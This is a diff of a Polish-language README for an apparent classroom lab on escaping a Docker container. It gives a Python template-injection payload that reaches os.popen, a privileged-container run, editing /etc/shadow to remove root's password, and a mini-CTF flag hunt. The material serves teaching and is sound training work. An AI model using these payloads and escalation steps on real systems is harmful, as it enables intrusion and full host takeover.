@@ -1,3 +1,4 @@
+
 # Docker-Escape
 This project shows vulnerability how to escape from Docker container in which web application is running. <br />
 
@@ -40,30 +41,61 @@ docker exec -itu adam ubuntu-dind bash
 
 ## Task 1 - Dostęp do serwera z perspektywy użytkownika aplikacji webowej
 Na kontenerze jest uruchomiona aplikacja webowa. Znając jej podatność omówioną podczas prezentacji spróbuj za pomocą preparacji url-a wykonać podstawowy pentesting (np. podawany podczas prezentacji przykład wyrażenia 7*7). <br />
-Następnie ... <br />
+Następnie jeżeli w wyniku wcześniejszego przykładu otrzymasz wynik 49 to możemy przejść dalej. <br />
+Do następnej czynności będziemy potrzebowali poniższej komendy. <br />
+
 ```
-tutaj ten długi wąż
+"baiim".__class__.__base__.__subclasses__()[<Liczba_Którą_Znalazłeś>].__init__.__globals__['sys'].modules['os'].popen(<Twoja_Komenda>).read()
 ```
 
-**Odpowiedź** - wyślij ss, który pokaże wszystkie pliki z aktualnego katalogu (wpisz tą komendę w popen()) 
+Najpierw jednak musimy znaleźć **LICZBĘ**. Aby ją odszukać użyj programu ``hack.py`` w konsoli.
+
+**Odpowiedź** - wyślij ss, który wylistuje wszystkie pliki i katalogi z aktualnego katalogu (wpisz tą komendę w popen()) 
 
 ## Task 2 - Docker Escape & Privilege Escalation
 **TIP** - proponujemy przejście z wykonywaniem zadań do terminala. <br />
 Ucieczkę z kontenera umożliwia nam złe skonfigurowanie kontenera. <br />
 
-Będąc w kontenerze musimy wywołać komendę:
+Spróbuj zmienić użytkownika na root-a (nie powinieneś mieć takiej możliwości - powinieneś być na adamie) {**PE**}: 
 ```
-    docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+su root
 ```
+Sprawdź listę dostępnych obrazów:
+```
+docker images
+```
+Pobierz obraz dockera z repozytorium:
+```
+docker pull ubuntu
+```
+<< SS >>
+Po pobraniu sprawdź czy obraz pobrał się poprawnie za pomocą:
+```
+docker images
+```
+Będąc na użytkowniku **adam** uruchom kontener {**DE**}:
+```
+docker run --rm -it --name kontener-adama --hostname ubuntu-by-adam --privileged ubuntu bash
+```
+Teraz jesteś wewnątrz swojego kontenera, którego przed chwilą stworzyłeś. Możesz to sprawdzić za pomocą komend ``whoami`` oraz ``hostname``. <br />
+Przykładowy ScreenShot znajduje się poniżej.
+<< ScreenShot >>
+Jak możesz zauważyć tworząc własny kontener masz w nim uprawnienia root-a. <br />
+<><><><><><><>
 Musimy zainstalować w kontenerze wybrany przez siebie edytor tekstowy (np. vim, nano). <br />
 Za pomocą edytora tekstowego otwieramy plik ``/etc/shadow``. <br />
-
-
+Trzeba usunąć część wskazującą na obecność hasła root-a w pliku shadow {**PE**}.
+<< ScreenShot >>
+Wyjdź z kontenera za pomocą ``exit``. <br />
+Zmień użytkownika na root-a {**PE**}:
+```
+su root
+```
 
 **Odpowiedź** - wyślij ss potwierdzającego twoje uprawnienia root-a. 
 
 ## Task 3 - Mini-CTF
-Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znajdź katalog, który nie powinien znajdować się w systemie/wyróżnia się spośród pozostałych. W nim znajdować plik z flagą. Zmodyfikuj znaleziony plik dodając swoje imię i nazwisko. <br />
+Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znajdź katalog, który nie powinien znajdować się w systemie/wyróżnia się spośród pozostałych. W nim znajduje się plik z flagą. Zmodyfikuj znaleziony plik dodając swoje imię i nazwisko. <br />
 
 **Odpowiedź** - wyślij widoczną zmodyfikowaną flagę wraz z dopisanym unikalnym tekstem wymienionym wyżej oraz ścieżkę do katalogu, w którym znajduje się znaleziona flaga. 
 
